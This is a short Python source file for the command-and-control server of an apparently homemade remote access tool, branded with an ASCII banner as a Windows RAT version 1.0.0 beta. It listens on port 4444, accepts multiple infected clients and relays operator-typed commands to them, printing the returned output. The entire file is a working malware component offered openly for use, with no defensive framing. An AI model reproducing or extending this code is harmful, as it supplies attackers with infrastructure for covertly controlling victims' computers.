import os
from colorama import Fore, Style
import socket
import threading

# Variables
clients = []

# Functions
def Banner():
    print(Fore.LIGHTGREEN_EX + """
        ▄▄███▄▄·███████╗██╗   ██╗██████╗  ██████╗         ██████╗  █████╗ ████████╗
        ██╔════╝██╔════╝██║   ██║██╔══██╗██╔═══██╗        ██╔══██╗██╔══██╗╚══██╔══╝
    """ + Fore.GREEN + """    ███████╗███████╗██║   ██║██║  ██║██║   ██║        ██████╔╝███████║   ██║   
        ╚════██║╚════██║██║   ██║██║  ██║██║   ██║        ██╔══██╗██╔══██║   ██║   
        ███████║███████║╚██████╔╝██████╔╝╚██████╔╝███████╗██║  ██║██║  ██║   ██║   
        ╚═▀▀▀══╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                                                           
    """ + Fore.RESET)
    print(Fore.YELLOW + "                          [+] VERSION 1.0.0 (Beta)" + Fore.RESET)
    print(Fore.YELLOW + "                          [+] Current OS Versions: " + Fore.LIGHTBLUE_EX + "Windows" + Fore.RESET)

def handle_client(client_socket, address):
    print(f"New connection from {address}")
    try:
        while True:
            command = input(f"Command to send to {address} (type 'exit' to disconnect): ")
            client_socket.send(command.encode())
            if command.lower() == "exit":
                break
            data = client_socket.recv(4096).decode()
            print(f"[{address}] {data}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        print(f"Connection closed: {address}")

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"Server listening on {host}:{port}")
    while True:
        client_socket, addr = server.accept()
        clients.append(client_socket)
        thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        thread.start()

Banner()
start_server()